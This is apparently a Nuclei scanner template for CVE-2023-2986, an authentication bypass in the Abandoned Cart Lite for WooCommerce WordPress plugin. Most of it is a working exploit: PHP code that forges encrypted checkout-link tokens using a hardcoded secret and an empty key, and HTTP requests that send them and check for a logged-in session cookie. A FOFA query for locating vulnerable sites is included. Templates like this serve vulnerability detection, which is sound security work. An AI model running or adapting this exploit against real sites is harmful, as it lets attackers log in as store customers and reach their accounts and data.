code:
- engine:
  - php
  source: "<?php\nclass Wcal_Aes {\n\n    /**\n    * AES Cipher function [\uFFFD5.1]:\
    \ encrypt 'input' with Rijndael algorithm\n    *\n    * @param input message as\
    \ byte-array (16 bytes)\n    * @param w     key schedule as 2D byte-array (Nr+1\
    \ x Nb bytes) -\n    *              generated from the cipher key by keyExpansion()\n\
    \    * @return      ciphertext as byte-array (16 bytes)\n    * @since 2.8\n  \
    \  */\n    public static function cipher( $input, $w ) {\n        $Nb    = 4;\
    \ // block size (in words): no of columns in state (fixed at 4 for AES)\n    \
    \    $Nr    = count( $w ) / $Nb - 1; // no of rounds: 10/12/14 for 128/192/256-bit\
    \ keys\n        $state = array(); // initialise 4xNb byte-array 'state' with input\
    \ [\uFFFD3.4]\n        for ( $i = 0; $i < 4 * $Nb;\n        $i++ ) {\n       \
    \     $state[ $i % 4 ][ floor( $i / 4 ) ] = $input[ $i ];\n        }\n\n     \
    \   $state = self::addRoundKey( $state, $w, 0, $Nb );\n\n        for ( $round\
    \ = 1; $round < $Nr; $round++ ) { // apply Nr rounds\n            $state = self::subBytes(\
    \ $state, $Nb );\n            $state = self::shiftRows( $state, $Nb );\n     \
    \       $state = self::mixColumns( $state, $Nb );\n            $state = self::addRoundKey(\
    \ $state, $w, $round, $Nb );\n        }\n\n        $state = self::subBytes( $state,\
    \ $Nb );\n        $state = self::shiftRows( $state, $Nb );\n        $state = self::addRoundKey(\
    \ $state, $w, $Nr, $Nb );\n\n        $output = array( 4 * $Nb ); // convert state\
    \ to 1-d array before returning [\uFFFD3.4]\n        for ( $i = 0; $i < 4 * $Nb;\n\
    \        $i++ ) {\n            $output[ $i ] = $state[ $i % 4 ][ floor( $i / 4\
    \ ) ];\n        }\n        return $output;\n    }\n    /**\n    * Xor Round Key\
    \ into state S [\uFFFD5.1.4].\n    *\n    * @since 2.8\n    */\n    private static\
    \ function addRoundKey( $state, $w, $rnd, $Nb ) {\n        for ( $r = 0; $r <\
    \ 4; $r++ ) {\n            for ( $c = 0; $c < $Nb;\n            $c++ ) {\n   \
    \             $state[ $r ][ $c ] ^= $w[ $rnd * 4 + $c ][ $r ];\n            }\n\
    \        }\n        return $state;\n    }\n\n    /**\n    * Apply SBox to state\
    \ S [\uFFFD5.1.1].\n    *\n    * @since 2.8\n    */\n    private static function\
    \ subBytes( $s, $Nb ) {\n        for ( $r = 0; $r < 4; $r++ ) {\n            for\
    \ ( $c = 0; $c < $Nb;\n            $c++ ) {\n                $s[ $r ][ $c ] =\
    \ self::$sBox[ $s[ $r ][ $c ] ];\n            }\n        }\n        return $s;\n\
    \    }\n\n    /**\n    * Shift row r of state S left by r bytes [\uFFFD5.1.2].\n\
    \    *\n    * @since 2.8\n    */\n    private static function shiftRows( $s, $Nb\
    \ ) {\n        $t = array( 4 );\n        for ( $r = 1; $r < 4; $r++ ) {\n    \
    \        for ( $c = 0; $c < 4;\n            $c++ ) {\n                $t[ $c ]\
    \ = $s[ $r ][ ( $c + $r ) % $Nb ]; // shift into temp copy\n            }\n  \
    \          for ( $c = 0; $c < 4;\n            $c++ ) {\n                $s[ $r\
    \ ][ $c ] = $t[ $c ]; // and copy back\n            }\n        } // note that\
    \ this will work for Nb=4,5,6, but not 7,8 (always 4 for AES):\n        return\
    \ $s; // see fp.gladman.plus.com/cryptography_technology/rijndael/aes.spec.311.pdf\n\
    \    }\n\n    /**\n    * Combine bytes of each col of state S [\uFFFD5.1.3].\n\
    \    *\n    * @since 2.8\n    */\n    private static function mixColumns( $s,\
    \ $Nb ) {\n        for ( $c = 0; $c < 4; $c++ ) {\n            $a = array( 4 );\
    \ // 'a' is a copy of the current column from 's'\n            $b = array( 4 );\
    \ // 'b' is a\uFFFD{02} in GF(2^8)\n            for ( $i = 0; $i < 4; $i++ ) {\n\
    \                $a[ $i ] = $s[ $i ][ $c ];\n                $b[ $i ] = $s[ $i\
    \ ][ $c ] & 0x80 ? $s[ $i ][ $c ] << 1 ^ 0x011b : $s[ $i ][ $c ] << 1;\n     \
    \       }\n            // a[n] ^ b[n] is a\uFFFD{03} in GF(2^8)\n            $s[0][\
    \ $c ] = $b[0] ^ $a[1] ^ $b[1] ^ $a[2] ^ $a[3]; // 2*a0 + 3*a1 + a2 + a3\n   \
    \         $s[1][ $c ] = $a[0] ^ $b[1] ^ $a[2] ^ $b[2] ^ $a[3]; // a0 * 2*a1 +\
    \ 3*a2 + a3\n            $s[2][ $c ] = $a[0] ^ $a[1] ^ $b[2] ^ $a[3] ^ $b[3];\
    \ // a0 + a1 + 2*a2 + 3*a3\n            $s[3][ $c ] = $a[0] ^ $b[0] ^ $a[1] ^\
    \ $a[2] ^ $b[3]; // 3*a0 + a1 + a2 + 2*a3\n        }\n        return $s;\n   \
    \ }\n\n    /**\n    * Generate Key Schedule from Cipher Key [\uFFFD5.2].\n   \
    \ *\n    * Perform key expansion on cipher key to generate a key schedule.\n \
    \   *\n    * @param  key cipher key byte-array (16 bytes).\n    * @return key\
    \ schedule as 2D byte-array (Nr+1 x Nb bytes).\n    * @since 2.8\n    */\n   \
    \ public static function keyExpansion( $key ) {\n        $Nb = 4; // block size\
    \ (in words): no of columns in state (fixed at 4 for AES)\n        $Nk = count(\
    \ $key ) / 4; // key length (in words): 4/6/8 for 128/192/256-bit keys\n     \
    \   $Nr = $Nk + 6; // no of rounds: 10/12/14 for 128/192/256-bit keys\n\n    \
    \    $w    = array();\n        $temp = array();\n\n        for ( $i = 0; $i <\
    \ $Nk; $i++ ) {\n            $r       = array( $key[ 4 * $i ], $key[ 4 * $i +\
    \ 1 ], $key[ 4 * $i + 2 ], $key[ 4 * $i + 3 ] );\n            $w[ $i ] = $r;\n\
    \        }\n\n        for ( $i = $Nk; $i < ( $Nb * ( $Nr + 1 ) ); $i++ ) {\n \
    \           $w[ $i ] = array();\n            for ( $t = 0; $t < 4;\n         \
    \   $t++ ) {\n                $temp[ $t ] = $w[ $i - 1 ][ $t ];\n            }\n\
    \            if ( $i % $Nk == 0 ) {\n                $temp = self::subWord( self::rotWord(\
    \ $temp ) );\n                for ( $t = 0; $t < 4;\n                $t++ ) {\n\
    \                    $temp[ $t ] ^= self::$rCon[ $i / $Nk ][ $t ];\n         \
    \       }\n            } elseif ( $Nk > 6 && $i % $Nk == 4 ) {\n             \
    \   $temp = self::subWord( $temp );\n            }\n            for ( $t = 0;\
    \ $t < 4;\n            $t++ ) {\n                $w[ $i ][ $t ] = $w[ $i - $Nk\
    \ ][ $t ] ^ $temp[ $t ];\n            }\n        }\n        return $w;\n    }\n\
    \n    /**\n    * Apply SBox to 4-byte word w.\n    *\n    * @since 2.8\n    */\n\
    \    private static function subWord( $w ) {\n        for ( $i = 0; $i < 4;\n\
    \        $i++ ) {\n            $w[ $i ] = self::$sBox[ $w[ $i ] ];\n        }\n\
    \        return $w;\n    }\n\n    /**\n    * Rotate 4-byte word w left by one\
    \ byte.\n    *\n    * @since 2.8\n    */\n    private static function rotWord(\
    \ $w ) {\n        $tmp = $w[0];\n        for ( $i = 0; $i < 3;\n        $i++ )\
    \ {\n            $w[ $i ] = $w[ $i + 1 ];\n        }\n        $w[3] = $tmp;\n\
    \        return $w;\n    }\n\n    // sBox is pre-computed multiplicative inverse\
    \ in GF(2^8) used in subBytes and keyExpansion [\uFFFD5.1.1]\n    private static\
    \ $sBox = array(\n        0x63,\n        0x7c,\n        0x77,\n        0x7b,\n\
    \        0xf2,\n        0x6b,\n        0x6f,\n        0xc5,\n        0x30,\n \
    \       0x01,\n        0x67,\n        0x2b,\n        0xfe,\n        0xd7,\n  \
    \      0xab,\n        0x76,\n        0xca,\n        0x82,\n        0xc9,\n   \
    \     0x7d,\n        0xfa,\n        0x59,\n        0x47,\n        0xf0,\n    \
    \    0xad,\n        0xd4,\n        0xa2,\n        0xaf,\n        0x9c,\n     \
    \   0xa4,\n        0x72,\n        0xc0,\n        0xb7,\n        0xfd,\n      \
    \  0x93,\n        0x26,\n        0x36,\n        0x3f,\n        0xf7,\n       \
    \ 0xcc,\n        0x34,\n        0xa5,\n        0xe5,\n        0xf1,\n        0x71,\n\
    \        0xd8,\n        0x31,\n        0x15,\n        0x04,\n        0xc7,\n \
    \       0x23,\n        0xc3,\n        0x18,\n        0x96,\n        0x05,\n  \
    \      0x9a,\n        0x07,\n        0x12,\n        0x80,\n        0xe2,\n   \
    \     0xeb,\n        0x27,\n        0xb2,\n        0x75,\n        0x09,\n    \
    \    0x83,\n        0x2c,\n        0x1a,\n        0x1b,\n        0x6e,\n     \
    \   0x5a,\n        0xa0,\n        0x52,\n        0x3b,\n        0xd6,\n      \
    \  0xb3,\n        0x29,\n        0xe3,\n        0x2f,\n        0x84,\n       \
    \ 0x53,\n        0xd1,\n        0x00,\n        0xed,\n        0x20,\n        0xfc,\n\
    \        0xb1,\n        0x5b,\n        0x6a,\n        0xcb,\n        0xbe,\n \
    \       0x39,\n        0x4a,\n        0x4c,\n        0x58,\n        0xcf,\n  \
    \      0xd0,\n        0xef,\n        0xaa,\n        0xfb,\n        0x43,\n   \
    \     0x4d,\n        0x33,\n        0x85,\n        0x45,\n        0xf9,\n    \
    \    0x02,\n        0x7f,\n        0x50,\n        0x3c,\n        0x9f,\n     \
    \   0xa8,\n        0x51,\n        0xa3,\n        0x40,\n        0x8f,\n      \
    \  0x92,\n        0x9d,\n        0x38,\n        0xf5,\n        0xbc,\n       \
    \ 0xb6,\n        0xda,\n        0x21,\n        0x10,\n        0xff,\n        0xf3,\n\
    \        0xd2,\n        0xcd,\n        0x0c,\n        0x13,\n        0xec,\n \
    \       0x5f,\n        0x97,\n        0x44,\n        0x17,\n        0xc4,\n  \
    \      0xa7,\n        0x7e,\n        0x3d,\n        0x64,\n        0x5d,\n   \
    \     0x19,\n        0x73,\n        0x60,\n        0x81,\n        0x4f,\n    \
    \    0xdc,\n        0x22,\n        0x2a,\n        0x90,\n        0x88,\n     \
    \   0x46,\n        0xee,\n        0xb8,\n        0x14,\n        0xde,\n      \
    \  0x5e,\n        0x0b,\n        0xdb,\n        0xe0,\n        0x32,\n       \
    \ 0x3a,\n        0x0a,\n        0x49,\n        0x06,\n        0x24,\n        0x5c,\n\
    \        0xc2,\n        0xd3,\n        0xac,\n        0x62,\n        0x91,\n \
    \       0x95,\n        0xe4,\n        0x79,\n        0xe7,\n        0xc8,\n  \
    \      0x37,\n        0x6d,\n        0x8d,\n        0xd5,\n        0x4e,\n   \
    \     0xa9,\n        0x6c,\n        0x56,\n        0xf4,\n        0xea,\n    \
    \    0x65,\n        0x7a,\n        0xae,\n        0x08,\n        0xba,\n     \
    \   0x78,\n        0x25,\n        0x2e,\n        0x1c,\n        0xa6,\n      \
    \  0xb4,\n        0xc6,\n        0xe8,\n        0xdd,\n        0x74,\n       \
    \ 0x1f,\n        0x4b,\n        0xbd,\n        0x8b,\n        0x8a,\n        0x70,\n\
    \        0x3e,\n        0xb5,\n        0x66,\n        0x48,\n        0x03,\n \
    \       0xf6,\n        0x0e,\n        0x61,\n        0x35,\n        0x57,\n  \
    \      0xb9,\n        0x86,\n        0xc1,\n        0x1d,\n        0x9e,\n   \
    \     0xe1,\n        0xf8,\n        0x98,\n        0x11,\n        0x69,\n    \
    \    0xd9,\n        0x8e,\n        0x94,\n        0x9b,\n        0x1e,\n     \
    \   0x87,\n        0xe9,\n        0xce,\n        0x55,\n        0x28,\n      \
    \  0xdf,\n        0x8c,\n        0xa1,\n        0x89,\n        0x0d,\n       \
    \ 0xbf,\n        0xe6,\n        0x42,\n        0x68,\n        0x41,\n        0x99,\n\
    \        0x2d,\n        0x0f,\n        0xb0,\n        0x54,\n        0xbb,\n \
    \       0x16,\n    );\n\n    // rCon is Round Constant used for the Key Expansion\
    \ [1st col is 2^(r-1) in GF(2^8)] [\uFFFD5.2]\n    private static $rCon = array(\n\
    \        array( 0x00, 0x00, 0x00, 0x00 ),\n        array( 0x01, 0x00, 0x00, 0x00\
    \ ),\n        array( 0x02, 0x00, 0x00, 0x00 ),\n        array( 0x04, 0x00, 0x00,\
    \ 0x00 ),\n        array( 0x08, 0x00, 0x00, 0x00 ),\n        array( 0x10, 0x00,\
    \ 0x00, 0x00 ),\n        array( 0x20, 0x00, 0x00, 0x00 ),\n        array( 0x40,\
    \ 0x00, 0x00, 0x00 ),\n        array( 0x80, 0x00, 0x00, 0x00 ),\n        array(\
    \ 0x1b, 0x00, 0x00, 0x00 ),\n        array( 0x36, 0x00, 0x00, 0x00 ),\n    );\n\
    \n}\nfunction urs( $a, $b ) {\n        $a  = intval( $a ) & 0xffffffff;\n    \
    \    $b &= 0x1f; // (bounds check)\n        if ( $a & 0x80000000 && $b > 0 ) {\
    \ // if left-most bit set.\n            $a     = ( $a >> 1 ) & 0x7fffffff; //\
    \ right-shift one bit & clear left-most bit.\n            $check = $b - 1;\n \
    \           $a     = $a >> ( $check ); // remaining right-shifts.\n        } else\
    \ { // otherwise.\n            $a = ( $a >> $b ); // use normal right-shift.\n\
    \        }\n        return $a;\n  }\n\n\n  function encrypt( $plaintext, $password,\
    \ $nBits ) {\n        $blockSize = 16; // block size fixed at 16 bytes / 128 bits\
    \ (Nb=4) for AES\n        if ( ! ( $nBits == 128 || $nBits == 192 || $nBits ==\
    \ 256 ) ) {\n            return ''; // standard allows 128/192/256 bit keys\n\
    \        }\n        // note PHP (5) gives us plaintext and password in UTF8 encoding!\n\
    \n        // use AES itself to encrypt password to get cipher key (using plain\
    \ password as source for\n        // key expansion) - gives us well encrypted\
    \ key\n        $nBytes  = $nBits / 8; // no bytes in key\n        $pwBytes = array();\n\
    \        for ( $i = 0; $i < $nBytes;\n        $i++ ) {\n            $pwBytes[\
    \ $i ] = ord( substr( $password, $i, 1 ) ) & 0xff;\n        }\n        $key =\
    \ Wcal_Aes::cipher( $pwBytes, Wcal_Aes::keyExpansion( $pwBytes ) );\n        $key\
    \ = array_merge( $key, array_slice( $key, 0, $nBytes - 16 ) ); // expand key to\
    \ 16/24/32 bytes long\n\n        // initialise 1st 8 bytes of counter block with\
    \ nonce (NIST SP800-38A \uFFFDB.2): [0-1] = millisec,\n        // [2-3] = random,\
    \ [4-7] = seconds, giving guaranteed sub-ms uniqueness up to Feb 2106\n      \
    \  $counterBlock = array();\n        $nonce        = floor( microtime( true )\
    \ * 1000 ); // timestamp: milliseconds since 1-Jan-1970\n        $nonceMs    \
    \  = $nonce % 1000;\n        $nonceSec     = floor( $nonce / 1000 );\n       \
    \ $nonceRnd     = floor( rand( 0, 0xffff ) );\n\n        for ( $i = 0; $i < 2;\n\
    \        $i++ ) {\n            $counterBlock[ $i ] = urs( $nonceMs, $i * 8 ) &\
    \ 0xff;\n        }\n        for ( $i = 0; $i < 2;\n        $i++ ) {\n        \
    \    $counterBlock[ $i + 2 ] = urs( $nonceRnd, $i * 8 ) & 0xff;\n        }\n \
    \       for ( $i = 0; $i < 4;\n        $i++ ) {\n            $counterBlock[ $i\
    \ + 4 ] = urs( $nonceSec, $i * 8 ) & 0xff;\n        }\n\n        // and convert\
    \ it to a string to go on the front of the ciphertext\n        $ctrTxt = '';\n\
    \        for ( $i = 0; $i < 8;\n        $i++ ) {\n            $ctrTxt .= chr(\
    \ $counterBlock[ $i ] );\n        }\n\n        // generate key schedule - an expansion\
    \ of the key into distinct Key Rounds for each round\n        $keySchedule = Wcal_Aes::keyExpansion(\
    \ $key );\n        // print_r($keySchedule);\n\n        $blockCount = ceil( strlen(\
    \ $plaintext ) / $blockSize );\n        $ciphertxt  = array(); // ciphertext as\
    \ array of strings\n\n        for ( $b = 0; $b < $blockCount; $b++ ) {\n     \
    \       // set counter (block #) in last 8 bytes of counter block (leaving nonce\
    \ in 1st 8 bytes)\n            // done in two stages for 32-bit ops: using two\
    \ words allows us to go past 2^32 blocks (68GB)\n            for ( $c = 0; $c\
    \ < 4;\n            $c++ ) {\n                $counterBlock[ 15 - $c ] = urs(\
    \ $b, $c * 8 ) & 0xff;\n            }\n            for ( $c = 0; $c < 4;\n   \
    \         $c++ ) {\n                $counterBlock[ 15 - $c - 4 ] = urs( $b / 0x100000000,\
    \ $c * 8 );\n            }\n\n            $cipherCntr = Wcal_Aes::cipher( $counterBlock,\
    \ $keySchedule ); // -- encrypt counter block --\n\n            // block size\
    \ is reduced on final block\n            $blockLength = $b < $blockCount - 1 ?\
    \ $blockSize : ( strlen( $plaintext ) - 1 ) % $blockSize + 1;\n            $cipherByte\
    \  = array();\n\n            for ( $i = 0; $i < $blockLength; $i++ ) { // -- xor\
    \ plaintext with ciphered counter byte-by-byte --\n                $cipherByte[\
    \ $i ] = $cipherCntr[ $i ] ^ ord( substr( $plaintext, $b * $blockSize + $i, 1\
    \ ) );\n                $cipherByte[ $i ] = chr( $cipherByte[ $i ] );\n      \
    \      }\n            $ciphertxt[ $b ] = implode( '', $cipherByte ); // escape\
    \ troublesome characters in ciphertext\n        }\n\n        // implode is more\
    \ efficient than repeated string concatenation\n        $ciphertext = $ctrTxt\
    \ . implode( '', $ciphertxt );\n        $ciphertext = base64_encode( $ciphertext\
    \ );\n        return $ciphertext;\n    }\n    $validate_val = getenv('cart_id').'&url='.\
    \ getenv('Scheme') . '://' . getenv('Host'). ':'. getenv('Port') .'/checkout/';\n\
    \    $secret = 'qJB0rGtIn5UB1xG03efyCp';\n    echo encrypt($validate_val, '',\
    \ 256) . \":\" . encrypt($validate_val,$secret , 256);\n"
http:
- headers: null
  method: GET
  path:
  - '{{BaseURL}}/?wcal_action=checkout_link&user_email=test&validate={{replace_regex(code_response,''(.*:)'','''')}}'
- headers: null
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - wordpress_logged_in_
    - /checkout/
  - negative: true
    part: body
    type: word
    words:
    - Link expired
  - status:
    - 302
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?wcal_action=checkout_link&user_email=test&validate={{replace_regex(code_response,''(:.*)'','''')}}'
  stop-at-first-match: true
id: CVE-2023-2986
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:tychesoftwares:abandoned_cart_lite_for_woocommerce:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-2986
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99658
    epss-score: 0.91644
  description: 'The Abandoned Cart Lite for WooCommerce plugin for WordPress is vulnerable
    to authentication bypass in versions up to, and including, 5.14.2. This is due
    to insufficient encryption on the user being supplied during the abandoned cart
    link decode through the plugin. This allows unauthenticated attackers to log in
    as users who have abandoned the cart, who are typically customers. Further security
    hardening was introduced in version 5.15.1 that ensures sites are no longer vulnerable
    through historical check-out links, and additional hardening was introduced in
    version 5.15.2 that ensured null key values wouldn''t permit the authentication
    bypass.

    '
  impact: 'Attackers can log in as users, potentially accessing sensitive information
    and performing unauthorized actions.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/woocommerce-abandoned-cart/"
    framework: wordpress
    product: abandoned_cart_lite_for_woocommerce
    vendor: tychesoftwares
    verified: true
  name: Abandoned Cart Lite for WooCommerce - Authentication Bypass
  reference:
  - https://github.com/Alucard0x1/CVE-2023-2986
  - https://github.com/TycheSoftwares/woocommerce-abandoned-cart/pull/885#issuecomment-1601813615
  - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2925274%40woocommerce-abandoned-cart&new=2925274%40woocommerce-abandoned-cart&sfp_email=&sfph_mail=
  - https://www.wordfence.com/blog/2023/06/tyche-softwares-addresses-authentication-bypass-vulnerability-in-abandoned-cart-lite-for-woocommerce-wordpress-plugin/
  - https://github.com/Ayantaker/CVE-2023-2986
  remediation: 'Upgrade Abandoned Cart Lite for WooCommerce plugin to version 5.15.2
    or later that implements secure authentication and proper encryption.

    '
  severity: critical
  tags: cve,cve2023,wordpress,woocommerce,wp-plugin,auth-bypass,woocommerce-abandoned-cart,vkev,vuln
